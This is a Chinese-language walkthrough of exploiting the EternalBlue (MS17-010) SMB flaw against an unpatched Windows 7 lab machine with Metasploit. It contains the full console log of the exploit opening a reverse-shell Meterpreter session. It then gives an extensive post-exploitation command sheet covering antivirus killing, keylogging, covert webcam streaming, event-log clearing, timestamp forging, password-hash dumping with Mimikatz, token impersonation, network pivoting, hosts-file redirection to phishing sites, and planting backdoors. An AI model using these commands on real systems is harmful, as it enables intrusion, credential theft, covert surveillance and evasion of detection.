# 漏洞简介
永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。

Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

# **影响版本**
目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

# 复现工具
靶机：<font style="color:#333333;">Windows 7 x64（未开启防火墙，开启445端口，未安装杀毒软件）</font>

攻击端：VMware虚拟机：kali-linux-2020.2a-vmware-amd64

# 开始复现
> 我的Windows 7是全新安装的，未安装任何补丁
>

首先启动Windows 7虚拟机：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415407258-658d14f8-2b10-4e1d-a62b-6b06a0f76f2c.png)

关闭防火墙：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415447007-a2405075-75f8-473b-8609-ea99ccd09b2a.png)

查看靶机的IP地址（cmd->ipconfig）

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415514196-facb3bab-43c7-4d0a-9aab-1ddede236dfa.png)

记下此IP地址：192.168.11.131

启动kali虚拟机，先试探能否连接靶机：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415727681-e1578ffc-61d0-44ea-8433-a9e51044655e.png)

以管理员身份运行nmap，查找靶机所开启的端口，如下图所示

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415691865-ef6ebf35-f725-4658-b7e2-711955d9a616.png)

从上图可以看到，靶机的445端口已开启，有可能触发漏洞

进入渗透神器：msfconsole

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595415911283-8995988b-36c7-46ba-90f7-08e90a98efcc.png)

输入“search MS17-010”以查找此漏洞

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595416086376-2476c8fa-abab-4aed-8bc4-35e41f88245e.png)

如上图所示：可以看到有auxiliary（辅助）模块和exploit（攻击）模块

可以先使用辅助扫描模块进行测试，如下图：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595416256577-9a7c7742-dea3-4fa1-9b09-72c6727d2892.png)

可以看到，靶机容易遭受到MS17-010漏洞的攻击，接下来使用攻击模块进行攻击：

> 选择攻击模块时注意选择合适的版本，有些版本使用于win8以上
>

设置流程如下：

set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp

> 要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload
>

show options ：使用该命令会列出使用当前模块所需呀配置的参数

set RHOSTS（rhosts） 目标主机地址 ：该命令会设置好要攻击的目标主机地址

set LHOST（lhost） 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机

set LPORT（lport） 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444

run、exploit：开始攻击

这里攻击端的IP地址为：192.168.11.150

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595416589945-d05b181c-a891-4608-8649-86426a064fad.png)

攻击端设置如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595416803556-93d6d715-5867-4888-8105-3649a0f6af1c.png)

输入run以进行攻击：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595416847854-81c7b9b0-fa6e-4887-a7cc-5c6f350a280d.png)

出现WIN就说明攻击成功，详细的日志信息如下：

```powershell
ali@kali:~/Desktop$ nmap -sS 192.168.11.131
You requested a scan type which requires root privileges.
QUITTING!
kali@kali:~/Desktop$ sudo nmap -sS 192.168.11.131
[sudo] kali 的密码：
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 07:01 EDT
Nmap scan report for 192.168.11.131
Host is up (0.00043s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
2869/tcp  open  icslap
5357/tcp  open  wsdapi
10243/tcp open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 00:0C:29:45:1C:98 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds
kali@kali:~/Desktop$ ping 192.168.11.131
PING 192.168.11.131 (192.168.11.131) 56(84) bytes of data.
64 bytes from 192.168.11.131: icmp_seq=1 ttl=128 time=0.493 ms
64 bytes from 192.168.11.131: icmp_seq=2 ttl=128 time=0.961 ms
64 bytes from 192.168.11.131: icmp_seq=3 ttl=128 time=1.25 ms
64 bytes from 192.168.11.131: icmp_seq=4 ttl=128 time=1.08 ms
^Z
[1]+  已停止               ping 192.168.11.131
kali@kali:~/Desktop$ msfconsole
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                                                                                                 
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                                                                                                 
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                                                                                                 
     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                                                                                                    
          ".@' ; @       @ `.  ;'                                                                                                                                                                                                          
            |@@@@ @@@     @    .                                                                                                                                                                                                           
             ' @@@ @@   @@    ,                                                                                                                                                                                                            
              `.@@@@    @@   .                                                                                                                                                                                                             
                ',@@     @   ;           _____________                                                                                                                                                                                     
                 (   3 C    )     /|___ / Metasploit! \                                                                                                                                                                                    
                 ;@'. __*__,."    \|--- \_____________/                                                                                                                                                                                    
                  '(.,...."/                                                                                                                                                                                                               


       =[ metasploit v5.0.87-dev                          ]
+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the resource command to run commands from a file

msf5 > search MS17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


msf5 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.11.131                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.11.131
rhosts => 192.168.11.131
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.11.150
lhost => 192.168.11.150
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.11.150:4444 
[*] 192.168.11.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.11.131:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.11.131:445    - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.11.131:445 - Connecting to target for exploitation.
[+] 192.168.11.131:445 - Connection established for exploitation.
[+] 192.168.11.131:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.11.131:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.11.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.11.131:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.11.131:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.11.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.11.131:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.11.131:445 - Sending all but last fragment of exploit packet
[*] 192.168.11.131:445 - Starting non-paged pool grooming
[+] 192.168.11.131:445 - Sending SMBv2 buffers
[+] 192.168.11.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.11.131:445 - Sending final SMBv2 buffers.
[*] 192.168.11.131:445 - Sending last fragment of exploit packet!
[*] 192.168.11.131:445 - Receiving response from exploit packet
[+] 192.168.11.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.11.131:445 - Sending egg to corrupted connection.
[*] 192.168.11.131:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 192.168.11.131
[*] Meterpreter session 1 opened (192.168.11.150:4444 -> 192.168.11.131:49166) at 2020-07-22 07:20:04 -0400
[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.11.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter > 
```

getshell之后就进入了meterpreter

> meterpreter是metasploit框架中的一个扩展模块，作为溢出成功后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。
>

meterpreter shell作为渗透模块有很多有用的功能，比如：添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS（基于主机的入侵检测系统) 很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。

若getshell之后没有进入meterpreter：

[https://www.jianshu.com/p/cee0c3948662](https://www.jianshu.com/p/cee0c3948662)

或者使用：sessions -u sessionI（升级一个普通的Windows shell到metasploit shell）

# meterpreter的简单使用
## 1、开启Windows靶机system权限的命令行
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595417439244-6cd0d1aa-e39e-4850-9b25-d5a529d1bf3f.png)

> 退出cmd的方法：输入exit，回车
>

## 2、对靶机进行截图监控
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595417587787-0dde805e-4e1c-4f15-9c77-7ab9085063d8.png)

截图保存在了桌面上

Windows端：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595417792385-0cad16cd-68dd-4f7d-9c64-26604d7aaeba.png)

kali端截图：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595417804395-4ff84ea2-1ae2-4107-85ad-94cfc2da0df0.png)

## 3、获取按键信息：
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595417969607-cfcd7df8-e0c4-4718-a039-9e04321b0093.png)

开始获取：keyscan_start

下载内容：keyscan_dump

停止获取：keyscan_stop

> 没有获取到，应该需要在捕获的同时需要进行键盘操作
>

## 4、清除事件日志
执行“clearev”命令，将清除事件日志。

# 附：常用的命令
文章来自：[https://blog.csdn.net/qq_41880069/article/details/82908293](https://blog.csdn.net/qq_41880069/article/details/82908293)

[https://www.cnblogs.com/wangyuyang1016/p/11032201.html](https://www.cnblogs.com/wangyuyang1016/p/11032201.html#raligun%E7%BB%84%E4%BB%B6%E6%93%8D%E4%BD%9Cwindowsapi)

以下所有操作均是在meterpreter模块下，获取目标主机的meterpreter shell为所有操作的前提

攻陷目标操作系统系统后就可以进入Meterpreter会话

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595419156156-c4e8114f-5c52-4fe3-b6af-b2b6b735bdb6.png)

> 
>



## 一：进程迁移
进程迁移的原因与目的：在刚拿到meterpreter shell时，该shell是极其脆弱的，通过进程迁移，把该shell和一个稳定的进程绑定在一起，防止被检测到查杀。

### 1：获取目标主机正在运行的进程
指令：ps

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595419181813-c7f3bf80-c463-4abd-91ad-d0782902de74.png)

### 2：查看meterpreter shell的进程号
指令：getpid

### 3：进程迁移 （先找一个稳定的已打开的的应用进程）
指令：migrate <稳定的进程号>

此时再次使用 ps 指令，会发现原来的meterpreter shell的进程号没了，即该shell已经被绑定在计划中的稳定进程上了

### 4：自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）
指令：run post/windows/manage/migrate

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418198924-3f7da1f4-a323-41df-9e0b-793a38ec2935.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418202912-0236bab8-87e1-474d-9c62-0926c700fb4e.png)

## 二：系统命令
### 1：查看系统信息
指令：sysinfo

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595419133262-6673d655-2850-4097-b0fa-a8dffce6f437.png)

### 2：查看目标主机运行时间
指令：idletime

### 3：查看目标机是否运行在虚拟机上
指令：run post/windows/gather/checkvm

### 4：查看当前主机用户名及其权限
指令：getuid

### 5：关闭杀毒软件
指令：run post/windows/manage/killav

### 6：启动目标主机的3389端口即远程桌面协议
①指令：run post/windows/manage/enable_rdp

②指令：run getgui -e

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418209658-99024fbb-091f-4867-80a7-d49181941381.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418215828-764c4499-5fd9-4c51-8081-899c62a24647.png)

### 7：将当前会话放到后台
指令：background

### 8：端口转发
指令：portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口

指令：run getgui -f 6661 –e

实现效果如图：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418221945-ec8e97d6-44dc-47ac-a3ab-34acade7cec4.png)

### 9：路由route操作
①：查看已拿下的目标主机的内网IP段情况

指令：run get_local_subnets

②：添加路由（先使用background将meterpreter终端放到后台）

指令1：

+ route add <要添加的路由> 例：route add 192.168.111.0
+ route print （查看已添加的路由）

指令2：

+ run autoroute -s 192.168.159.0/24 #添加到目标环境网络
+ run autoroute –p #查看添加的路由

当目的路由被成功添加到已攻陷主机的路由表中，就可以借助被攻陷的主机对其他网络进行攻击了。

添加路由后可以进行以被攻陷主机的ip扫描该网段下的其他主机

+ run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
+ run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=338
+ route print：显示当前活跃的路由设置，查看路由是否添加成功

### 10：关闭杀毒软件
命令：run killav



### 11：列举当前目标机有多少用户登录
命令：run post/windows/gather/enum_logged_on_users

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418228167-41638f94-cea9-4571-a6f9-98f0d9d3f888.png)



### 12：添加用户
①：run post/windows/manage/enable_rdp USERNAME=*** PASSWORD=******

②：run getgui -u example_username -p example_password



### 13：抓取目标机的屏幕截图
命令：

①：先输入load espia 加载插件 再输screengrab，会保存截图在root目 录下

②：输入 screenshot 效果同上

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418234562-55c041d4-a850-4094-9938-15d2a3425123.png)

截取的图片

![](https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1595418238134-8c20a9a8-49ae-4bc8-b7b0-1da3030c0c9e.jpeg)



### 14：webcam摄像头命令
①：查看目标机是否有摄像头：webcam_list

②：打开目标主机的摄像头拍一张照片：webcam_snap

③：打开目标主机的摄像头抓取视频（即直播）

指令：webcam_stream

该指令会返回一个url，在浏览器打开该地址即可观看



大家可以试一下这个命令，很好玩哟

### 15：进入目标机shell，获取目标主机的远程命令行
（如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试）

指令为：shell 结束指令为：exit



## 三：文件系统命令
常用指令如下

这些命令比较简单，但却很重要，就不截图详细说明了

+ getwd 或者pwd # 查看当前工作目录
+ ls #显示当前目录下的内容
+ cd #切换目录
+ search -f *.txt -d c:\ # 搜索文件 -f 指定文件类型，-d 指定在哪个目录下搜索
+ cat c:\test\testpasswd.txt # 查看文件内容
+ upload /tmp/hack.txt C:\test # 上传hack.txt文件到目标机C盘test目录下
+ download c:\test.txt/root # 下载目标主机test.txt文件到本机root目录下
+ edit c:\1.txt #编辑或创建文件 没有的话，会新建文件
+ rm C:\lltest\hack.txt
+ mkdir lltest2 #只能在当前目录下创建文件夹
+ rmdir lltest2 #只能删除当前目录下文件夹
+ getlwd 或者 lpwd #操作攻击者主机 查看当前目录
+ lcd /tmp #操作攻击者主机 切换目录



## 四：其他常用命令
### 1：session命令
session 命令可以查看已经成功获取的会话

可以使用session -i 连接到指定序号的meterpreter会话已继续利用

### 2：timestomp伪造时间戳
时间戳的解释[http://blog.csdn.net/qq_41651465/article/details/80005362](http://blog.csdn.net/qq_41651465/article/details/80005362)

timestomp C:// -h #查看帮助

timestomp -v C://2.txt #查看时间戳

timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt

### 3：键盘记录器功能keyscan
命令：

keyscan_start 开启记录目标主机的键盘输入

keyscan_dump 输出截获到的目标键盘输入字符信息

keyscan_stop 停止键盘记录

### 4：系统账号密码获取
> Windows系统存储哈希值的方式一般是LM、NTLM或者NTLMv2。
>
> 在明文密码输入后系统会将密码转为哈希值；由于哈希值的长度限制，将密码切分为7个字符一组的哈希值；
>
> 以password123456密码为例，哈希值会以 【{passwor}{d123456}】每个花括号是一组哈希值共两组，所以攻击者只要破解7个字符一组的密码，而不是原始的14个字符，而NTLM存储方式和密码长度无关，密码将作为整体哈希值存储。
>

①：命令：hashdump

在拿到system权限下，使用该命令，可以查看系统账号密码的hash值，在cmd5在线破解网站可以尝试破解，或者采用后面的Mimikatz模块尝试爆破

②：使用hashdump脚本

命令：run hashdump

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418257587-089e4c08-1d75-4baf-a5b6-ee0c424fed7e.png)

post/windows/gether/hashdump模块：获取系统所有的用户名和密码哈希值

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595419439108-4170f380-ac75-43b0-a637-18edc313d1f1.png)

获取安全账户的账号管理器SAM数据库，我们需要运行在System权限下（use priv），以求绕过注册表的限制，获得受保护的用户和密码的SAM存储。

> use priv 命令：意味着运行在特权账号上
>

哈希值解析：

> 以 aad3b435 开头的哈希值是一个空的或不存在的哈希值（空字串的占位符）。
>

传递哈希值：

> 用哈希值传递技术，用psexec模块就可以实现，
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595419577155-3bee9e1d-1dd7-4861-8831-bec688732da6.png)

### 5：edit命令
调用vi编辑器，对目标主机上的文件修改

例如修改目标主机上的hosts文件，使得目标主机访问baidu时去到准备好的钓鱼网站

### 6：execute命令
在目标主机上运行某个程序 结合参数-H使用可以隐藏在后台打开程序

例：命令：execute -H -i -f cmd.exe 相当于获取shell，使用shell

### 7：信息收集
run post/windows/gather/enum_applications：获取目标主机上的软件安装信息

run post/windows/gather/dumplinks：目标主机上最近访问过的文档和链接信息

查看目标主机是否为虚拟机

run post/windows/gather/checkvm #是否虚拟机

run post/linux/gather/checkvm #是否虚拟机

### 8：权限提升
先输入getuid查看已获得的权限

尝试使用getsystem提权（倘若失败，只能使用内核漏洞提权）

### 9：漏洞提权：
①：使用命令：getsystem提权

②：使用其他漏洞攻击提权，如ms16-32

注意：在使用其他漏洞为当前会话提权时，攻击参数要设置好session 为当前对话的session，这样就能使用其他漏洞为当前会话提权了

### 10： 抓取密码
常见的在system权限下使用命令 hashdump 可以查看目标主机的用户和其对应的密码，其他抓取密码方法如下：

1：使用Qarks PwDump抓取密码，适用于Windows

2：使用Windows Credentials Editor 抓取密码，适用于Windows

3：使用Mimikatz抓取密码，metasploit集成（只能在管理员权限下使用）

①：load mimikatz （加载该模块）

②：msv 抓取系统的hash值

③：mimikatz_command -f samdump:: 抓取Hash

④：mimikatz_command -f service:: 查看服务

输入help mimikatz，可以查看所有mimikatz在metasploit里集成的命令，即可直接使用的命令

例：用msv命令可以抓取系统的Hash值，用wdigest命令可以获取系统账户信息

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418291756-b02a1c92-4bbb-4f6b-a944-dada3ed775dc.png)

使用mimikatz_command -f 加载一个不存在的模块，会显示所有mimikatz模块

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418297254-fc45bf78-2c89-4180-8d4d-48a2db4c7d96.png)

使用模块时在模块后面跟 :: 设置参数，当后面参数为空时，显示可用参数

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418314332-7f62575a-b551-4889-9a54-150308c5af05.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418310215-450f95e9-707b-40e0-a40d-6b3f9293f90c.png)

### 11：令牌欺骗
注：令牌是交互会话中的唯一身份标识符，假冒令牌的目的就是取得的令牌对应的身份的权限

1>：先输入use incognito

2>：再输入list_tokens -u 作用：列出所有可用的token

> 注：令牌分为：①授权令牌 Delegation Tokens 支持交互式登陆 ②模拟令牌 impersonation Tokens 非交互式令牌）
>
> 3>：再输入impersonate_token 上面获取的授权令牌（注：获取的令牌Hostname\Username应将中间的 \ 改为 \ \ 
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418313732-31983af9-73e3-43ca-98fb-21c73fb771db.png)

## 五：后门
### 1：Cymothoa后门
Cymothoa工具可以把ShellCode注入现有进程，伪装成常规程序

用法如下：

1：使用-p参数设置目标进程的pid

2：使用-s参数指定ShellCode的编号，查看所有ShellCode的编号使用命令：cymothoa -s

3：使用-y参数指定Payload服务端口号

完整命令示例：cymothoa -p 100 -s 1 -y 4444

注入成功后可以使用如下命令来连接目标主机的后门，等待返回shell

Nc -nvv 目标主机IP 4444

### 2：weevely
用法如下：

1>：生成后门

命令：weevely generate password/存放路径/try.php

生成一个名为try.php的后门，密码为password

2>：上传后门至web根目录下/var/www/html/（上传命令在之前的文件命令讲过，不再赘述）

3>：连接后门

命令：weevely 目标主机IP/shell所在目录/1.php password（密码）

weevely还可以生成图片后门。同时weevely还有多个模块使用，在连接上后门之后按两次Tab键，可以查看可利用的模块

### 3：meterpreter后门
用法如下：

1>：使用使用msfvenom创建shell，shell的类型可以自己选自，可以为php文件，exe文件等等

注：php文件可以放在web根目录下，方便直接启动

2>： 上传shell到目标服务器（上传命令在之前的文件命令讲过，不再赘述）

3>：在msf下设置监听模块，开始监听，设置方法为：

①：use exploit/multi//handler

②：set payload （payload可以自行选择）

③：访问或运行shell

④：获得目标主机反弹的shell，连接建立

这里以一个exe文件为例，大家可以尝试其他web文件

1>：创建shell

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418331390-8f15e69e-d099-4a7f-ac4b-2cc216e7dd64.png)

2>：上传shell

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418334656-ec607796-9a81-4024-900a-776a2e0bbc8a.png)

3>：设置监听模块，开始监听

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1595418337797-5087cead-8008-460c-8fb2-8f7333a67fcd.png)

